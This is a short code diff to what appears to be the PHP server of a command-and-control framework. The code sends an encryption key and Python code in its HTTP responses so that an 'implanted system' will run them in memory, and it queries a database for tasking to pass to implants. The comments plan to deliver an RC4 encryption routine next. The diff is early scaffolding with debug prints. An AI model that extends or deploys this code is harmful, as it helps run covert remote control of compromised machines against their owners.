@@ -53,9 +53,10 @@
         # Echoes out encryption key and routine in the HTTP response
         # This is the only time this encryption key is exchanged
 
-
         # TO DO: This will echo out the encryption key, but I need to also echo out the encryption function/routine (definition)
-        echo "k = '" . $encryption_key . "'";
+        # Each line in the encrypt() function needs two whitespaces or else it errors
+        # TO DO: Removing debugging code and add in echo of Python RC4 encryption routine here
+        echo "def encrypt():\n  k = '" . $encryption_key . "'" . "\n  print 'this is a test'\n  print k";
 
     }
     # Else old host
@@ -75,8 +76,8 @@
         $results = $statement->fetch();
         $row_count = $statement->rowCount();
 
-        # TO DO: This is just to show that the encryption key is now stored in memory on the implanted system
-        echo "print k";
+        # TO DO: This is just to show that the encryption key and routine are now stored in memory on the implanted system
+        echo "encrypt()";
 
         # If tasking found
         if ($row_count > "0") {
